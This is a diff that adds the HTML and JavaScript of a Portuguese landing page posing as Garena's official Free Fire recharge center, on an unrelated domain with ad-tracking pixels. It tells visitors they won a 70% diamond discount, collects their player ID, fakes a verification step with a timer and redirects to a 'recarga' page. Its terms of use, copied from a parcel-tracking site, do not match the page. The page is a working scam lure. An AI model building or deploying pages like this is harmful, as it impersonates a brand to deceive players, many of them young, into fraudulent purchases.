@@ -1,0 +1,158 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta name="csrf-token" content="zag2nUnUBjXzxaAjToN0sPebqVEhkizHQnCfsN5E">
+<title>Centro de Recarga Free Fire</title>
+<meta name="description" content="Centro de Recarga FreeFire">
+<meta name="keywords" content="recarga, freefire, diamantes, itens garena">
+<meta name="author" content="Garena">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#222">
+<meta name="apple-mobile-web-app-status-bar-style" content="#222">
+<meta name="msapplication-navbutton-color" content="#222">
+<link rel="canonical" href="index-1.htm">
+<link rel="shortcut icon" href="public/images/favicon.ico">
+<link rel="shortcut icon" href="public/images/favicon.ico">
+<link rel="icon" href="public/images/favicon.ico" sizes="32x32">
+<link rel="icon" href="public/images/favicon.ico" sizes="192x192">
+<link rel="apple-touch-icon" href="public/images/favicon.ico">
+<meta name="msapplication-TileImage" content="https://recarga-jogos.onl/public/images/favicon.ico">
+<link href="public/css/bootstrap.min.css" rel="stylesheet">
+<link href="public/css/swiper-bundle.min.css" rel="stylesheet">
+<link href="public/css/all.min.css" rel="stylesheet">
+<link href="public/css/style.css?v=1.0.4" rel="stylesheet">
+<script src="scripts/utms/latest.js" data-utmify-prevent-subids="" data-utmify-ignore-iframe="" async="" defer=""></script>
+<script>
+  window.googlePixelId = "684079fe9a0d13fb81d6c6e8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+</head>
+<body data-id="68961b5a5cb69">
+    <main id="content-page">
+        <section id="home" class="home1">
+    <div class="container">
+        <div class="entrada">
+            <div class="content">
+                <div class="image">
+                    <img src="public/images/freefire.png" alt="FreeFire Garena">
+                </div>
+                <h2>Parabéns! 🎉</h2>
+                <p>Você ganhou um cupom de desconto exclusivo do Free Fire!</p>
+                <div class="bonus">
+                    <span>Você ganhou 70% de desconto no plano de 5600 diamantes!</span>
+                </div>
+                <div class="resgatar">
+                    <h3><img src="public/images/diamond.png" alt="Diamantes">Coloque seu ID para fazer o resgate!</h3>
+                    <div class="content-form" id="containerForm">
+                        <input name="userId" id="userId" placeholder="Digite seu ID do Free Fire" autocomplete="off">
+                        <a href="javascript:void(0)" class="btn-resgatar d-flex align-items-center justify-content-center" id="checkIdButton"><i class="fa-solid fa-gift"></i> Resgatar Agora</a>
+                    </div>
+                    <div class="loader" id="loader" style="border-top-color:#004085;"></div>
+                </div>
+                <div id="messageSection"></div>
+                <small>*Oferta por tempo limitado. Sujeita à disponibilidade</small>
+                <hr class="separador">
+                <div class="copy">&copy; 2025 Todos os direitos reservados</div>
+                <div class="links d-flex align-items-center">
+                    <a href="javascript:void(0)" class="open-politica">Política de Privacidade</a>
+                    <a href="javascript:void(0)" class="open-termos">Termos de Uso</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<div class="modal" id="modal-privacidade">
+    <div class="modal-content">
+      <h2>Política de Privacidade</h2>
+      <p>Coletamos somente informações essenciais para fornecer nossos serviços com excelência. Seus dados são protegidos com criptografia de ponta e nunca são compartilhados com terceiros.</p>
+      <p>Ao utilizar nosso sistema, você concorda com os termos descritos nesta política.</p>
+    </div>
+</div>
+<div class="modal" id="modal-termos">
+    <div class="modal-content">
+      <h2>Termos de Uso</h2>
+      <p>Nosso site oferece rastreamento com base em dados públicos e atualizações fornecidas por transportadoras. Não garantimos prazos de entrega ou dados fornecidos por terceiros.</p>
+      <p>Ao continuar navegando, você concorda com nossos termos. Leia atentamente para total compreensão.</p>
+    </div>
+</div>
+    </main>
+<script src="public/js/jquery.min.js"></script>
+<script src="public/js/jquery.mask.min.js"></script>
+<script src="public/js/bootstrap.min.js"></script>
+<script src="public/js/swiper-bundle.min.js"></script>
+<script src="public/js/functions.js"></script>
+<script>
+    $('.open-politica').click(function(){
+        $('#modal-privacidade').addClass('active');
+    });
+
+    $('.open-termos').click(function(){
+        $('#modal-termos').addClass('active');
+    });
+
+    document.querySelectorAll('.modal').forEach(modal => {
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+            this.classList.remove('active');
+            }
+        });
+    });
+
+    const checkIdButton = document.getElementById('checkIdButton');
+    const formContainer = document.getElementById('containerForm');
+    const loader = document.getElementById('loader');
+    const inputSection = document.getElementById('userId');
+    const messageSection = document.getElementById('messageSection');
+
+    function displayMessage(text, type = 'info') {
+        messageSection.innerHTML = `<div class="alert ${type}">${text}</div>`;
+    }
+
+    function checkPlayerId() {
+        const playerUid = inputSection.value.trim();
+
+        if (!playerUid) {
+            displayMessage('Por favor, insira seu ID de Jogador para continuar.', 'alert-danger');
+            return;
+        }
+
+        if (!/^\d{6,12}$/.test(playerUid)) {
+            displayMessage('ID inválido. Por favor, insira apenas números (6 a 12 dígitos).', 'alert-danger');
+            return;
+        }
+
+        // Mostrar loader
+        loader.style.display = 'block';
+        checkIdButton.disabled = true;
+        messageSection.innerHTML = '';
+        formContainer.style.display = 'none';
+
+        // Simular processamento
+        setTimeout(() => {
+            // Salvar ID no localStorage
+            localStorage.setItem('loggedUserId', playerUid);
+            
+            // Limpar loader
+            loader.style.display = 'none';
+            
+            // Redirecionar para página de recarga
+            window.location.href = 'recarga.html';
+        }, 1500);
+    }
+
+    checkIdButton.addEventListener('click', checkPlayerId);
+
+    // Permitir pressionar Enter para submeter
+    inputSection.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            checkPlayerId();
+        }
+    });
+</script>
+</body>
+</html>
